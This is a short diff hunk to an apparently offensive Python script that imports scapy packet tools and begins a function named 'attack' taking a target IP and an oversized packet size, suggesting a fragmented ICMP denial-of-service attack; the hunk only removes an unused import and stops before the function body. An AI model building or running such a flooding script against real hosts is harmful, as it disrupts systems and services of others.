@@ -1,5 +1,4 @@
 from scapy.all import IP, ICMP, fragment, send
-import sys
 
 def attack(target_ip, size=65535):
     """
